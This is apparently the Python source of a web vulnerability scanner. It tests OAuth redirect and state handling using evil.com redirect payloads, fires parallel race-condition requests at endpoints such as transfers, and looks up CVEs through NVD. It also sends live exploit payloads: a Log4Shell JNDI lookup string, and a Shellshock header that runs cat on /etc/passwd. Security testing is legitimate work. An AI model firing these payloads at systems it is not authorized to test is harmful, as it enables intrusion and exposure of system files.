#!/usr/bin/env python3
"""OAuth Tester & CVE Hunter"""
import requests
import re

class OAuthTester:
    def __init__(self, target, scan_id, socketio, log_fn, finding_fn):
        self.target = target.rstrip('/')
        self.scan_id = scan_id
        self.log = log_fn
        self.add_finding = finding_fn
        self.session = requests.Session()
        self.session.verify = False

    def run(self):
        self.log(self.scan_id, "🔑 Testing OAuth configurations...", 'info', 'oauth')
        self._test_redirect_uri()
        self._test_state_param()
        self._test_pkce()
        self._test_token_endpoints()
        self.log(self.scan_id, "  ✅ OAuth test complete", 'info', 'oauth')

    def _test_redirect_uri(self):
        oauth_endpoints = [
            '/oauth/authorize', '/auth/authorize', '/oauth2/authorize',
            '/connect/authorize', '/api/oauth/authorize'
        ]
        
        evil_redirects = [
            'https://evil.com',
            'https://evil.com@' + re.sub(r'https?://', '', self.target),
            self.target + '.evil.com',
            'javascript:alert(1)',
        ]
        
        for ep in oauth_endpoints:
            try:
                r = self.session.get(self.target + ep, timeout=4)
                if r.status_code in [200, 302, 400]:
                    self.log(self.scan_id, f"  🔑 OAuth endpoint: {ep} [{r.status_code}]", 'data', 'oauth')
                    
                    for evil_uri in evil_redirects[:2]:
                        test_url = (f"{self.target}{ep}?"
                                    f"response_type=code&client_id=test"
                                    f"&redirect_uri={requests.utils.quote(evil_uri)}")
                        r2 = self.session.get(test_url, timeout=5, allow_redirects=False)
                        
                        location = r2.headers.get('Location', '')
                        if 'evil.com' in location:
                            self.add_finding(self.scan_id, {
                                'type': 'OAuth redirect_uri Bypass',
                                'severity': 'high',
                                'target': self.target + ep,
                                'description': 'OAuth redirect_uri validation bypass allows token theft',
                                'evidence': f'redirect_uri: {evil_uri}\nServer redirected to: {location}',
                                'cvss': 8.1,
                                'poc': f'curl -I "{test_url}"',
                                'remediation': 'Implement strict redirect_uri validation. Use exact string matching.',
                                'cwe': 'CWE-601'
                            })
            except:
                pass

    def _test_state_param(self):
        oauth_endpoints = ['/oauth/authorize', '/auth/authorize']
        for ep in oauth_endpoints:
            try:
                # Try without state parameter
                test_url = (f"{self.target}{ep}?response_type=code"
                            f"&client_id=test&redirect_uri=https://example.com/cb")
                r = self.session.get(test_url, timeout=4, allow_redirects=False)
                
                if r.status_code in [302, 301]:
                    location = r.headers.get('Location', '')
                    # If it redirected without requiring state, CSRF possible
                    if 'state' not in location and r.status_code == 302:
                        self.add_finding(self.scan_id, {
                            'type': 'OAuth CSRF - Missing State Parameter',
                            'severity': 'medium',
                            'target': self.target + ep,
                            'description': 'OAuth flow proceeds without state parameter - CSRF attack possible',
                            'evidence': f'Request without state param resulted in redirect: {location[:100]}',
                            'cvss': 5.4,
                            'remediation': 'Require and validate state parameter in all OAuth flows.',
                            'cwe': 'CWE-352'
                        })
            except:
                pass

    def _test_pkce(self):
        self.log(self.scan_id, "  🔒 Testing PKCE requirement...", 'info', 'oauth')
        # Test if public clients require PKCE
        ep = self.target + '/oauth/token'
        try:
            r = self.session.post(ep, data={
                'grant_type': 'authorization_code',
                'code': 'test_code',
                'redirect_uri': 'https://example.com/cb',
                'client_id': 'public_client'
            }, timeout=5)
            
            if r.status_code not in [400, 401]:
                self.log(self.scan_id, f"  ⚠️ Token endpoint responds without PKCE: {ep}", 'warning', 'oauth')
        except:
            pass

    def _test_token_endpoints(self):
        sensitive_endpoints = [
            '/oauth/token', '/auth/token', '/api/token',
            '/.well-known/openid-configuration',
        ]
        
        for ep in sensitive_endpoints:
            try:
                r = self.session.get(self.target + ep, timeout=4)
                if r.status_code == 200:
                    self.log(self.scan_id, f"  📋 OAuth config exposed: {ep}", 'data', 'oauth')
                    body = r.text.lower()
                    # Check for insecure algorithms
                    if '"none"' in body or '"alg":"none"' in body:
                        self.add_finding(self.scan_id, {
                            'type': 'JWT None Algorithm',
                            'severity': 'critical',
                            'target': self.target + ep,
                            'description': '"none" algorithm listed as supported - JWT bypass possible',
                            'evidence': 'OpenID config lists "none" as supported algorithm',
                            'cvss': 9.1,
                            'cwe': 'CWE-345'
                        })
            except:
                pass


class RaceConditionScanner:
    def __init__(self, target, scan_id, socketio, log_fn, finding_fn):
        self.target = target.rstrip('/')
        self.scan_id = scan_id
        self.log = log_fn
        self.add_finding = finding_fn

    def run(self):
        self.log(self.scan_id, "⚡ Testing race conditions...", 'info', 'race')
        self._test_parallel_requests()
        self.log(self.scan_id, "  ✅ Race condition test complete", 'info', 'race')

    def _test_parallel_requests(self):
        import threading
        import time
        
        race_endpoints = [
            '/api/coupon/apply',
            '/api/transfer',
            '/api/vote',
            '/api/like',
        ]
        
        for endpoint in race_endpoints:
            results = []
            lock = threading.Lock()
            
            def make_request():
                try:
                    s = requests.Session()
                    s.verify = False
                    r = s.post(
                        self.target + endpoint,
                        json={'test': 'race_condition_probe'},
                        timeout=5
                    )
                    with lock:
                        results.append(r.status_code)
                except Exception as e:
                    with lock:
                        results.append(0)
            
            threads = [threading.Thread(target=make_request) for _ in range(5)]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=8)
            
            if len(set(results)) > 1 and 200 in results:
                self.log(self.scan_id,
                    f"  ⚠️ Potential race condition: {endpoint} (responses: {results})",
                    'warning', 'race')


class CVEHunter:
    def __init__(self, target, scan_id, socketio, log_fn, finding_fn):
        self.target = target.rstrip('/')
        self.scan_id = scan_id
        self.log = log_fn
        self.add_finding = finding_fn
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 BugHunterPro/2.0'})

    def run(self):
        self.log(self.scan_id, "🛡️ Hunting CVEs...", 'info', 'cve')
        techs = self._detect_technologies()
        for tech in techs:
            self._query_cve_for_tech(tech)
        self._test_known_vulns()
        self.log(self.scan_id, "  ✅ CVE hunt complete", 'info', 'cve')

    def _detect_technologies(self):
        techs = []
        try:
            r = self.session.get(self.target, timeout=8)
            headers = {k.lower(): v for k, v in r.headers.items()}
            body = r.text.lower()
            
            server = headers.get('server', '')
            if server:
                techs.append(server)
                self.log(self.scan_id, f"  🖥️ Server: {server}", 'data', 'cve')
            
            xpb = headers.get('x-powered-by', '')
            if xpb:
                techs.append(xpb)
                
            if 'wordpress' in body: techs.append('WordPress')
            if 'drupal' in body: techs.append('Drupal')
            if 'joomla' in body: techs.append('Joomla')
            if 'laravel' in body: techs.append('Laravel')
        except:
            pass
        return techs

    def _query_cve_for_tech(self, tech):
        self.log(self.scan_id, f"  🔍 Querying CVEs for: {tech}", 'info', 'cve')
        try:
            # Query NVD API
            search_term = tech.split('/')[0].strip().lower()[:30]
            r = requests.get(
                f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={search_term}&resultsPerPage=5",
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                vulns = data.get('vulnerabilities', [])
                for vuln in vulns[:3]:
                    cve_id = vuln['cve']['id']
                    desc = vuln['cve']['descriptions'][0]['value'][:200]
                    metrics = vuln['cve'].get('metrics', {})
                    score = 'N/A'
                    if 'cvssMetricV31' in metrics:
                        score = metrics['cvssMetricV31'][0]['cvssData']['baseScore']
                    elif 'cvssMetricV2' in metrics:
                        score = metrics['cvssMetricV2'][0]['cvssData']['baseScore']
                    
                    self.log(self.scan_id, 
                        f"  ⚠️ {cve_id} (CVSS: {score}): {desc[:80]}...", 'warning', 'cve')
                    
                    if isinstance(score, (int, float)) and float(score) >= 7.0:
                        self.add_finding(self.scan_id, {
                            'type': f'Known CVE: {cve_id}',
                            'severity': 'high' if float(score) >= 7 else 'medium',
                            'target': self.target,
                            'description': f'Technology "{tech}" has known CVE: {cve_id}',
                            'evidence': f'CVE: {cve_id}\nCVSS: {score}\nDescription: {desc}',
                            'cvss': float(score),
                            'remediation': f'Update {tech} to the latest patched version. Check {cve_id} advisory.',
                            'references': [f'https://nvd.nist.gov/vuln/detail/{cve_id}']
                        })
        except:
            pass

    def _test_known_vulns(self):
        self.log(self.scan_id, "  🧪 Testing known vulnerability patterns...", 'info', 'cve')
        
        known_vulns = [
            # Log4Shell
            {'path': '/', 'header': {'X-Api-Version': '${jndi:ldap://127.0.0.1:1389/exploit}'},
             'name': 'Log4Shell (CVE-2021-44228)', 'cvss': 10.0},
            # Spring4Shell  
            {'path': '/actuator/env', 'header': {},
             'name': 'Spring Actuator Exposed', 'cvss': 7.5},
            # Shellshock
            {'path': '/cgi-bin/test.cgi', 
             'header': {'User-Agent': '() { :; }; echo; echo; /bin/cat /etc/passwd'},
             'name': 'Shellshock (CVE-2014-6271)', 'cvss': 9.8},
        ]
        
        for vuln in known_vulns:
            try:
                r = self.session.get(
                    self.target + vuln['path'],
                    headers=vuln['header'],
                    timeout=5
                )
                if r.status_code == 200:
                    if 'root:' in r.text or 'uid=' in r.text:
                        self.add_finding(self.scan_id, {
                            'type': vuln['name'],
                            'severity': 'critical',
                            'target': self.target + vuln['path'],
                            'description': f'Possible {vuln["name"]} vulnerability',
                            'evidence': f'Response: {r.text[:300]}',
                            'cvss': vuln['cvss'],
                            'cwe': 'CWE-78'
                        })
                    self.log(self.scan_id, f"  🔍 Tested: {vuln['name']}", 'info', 'cve')
            except:
                pass
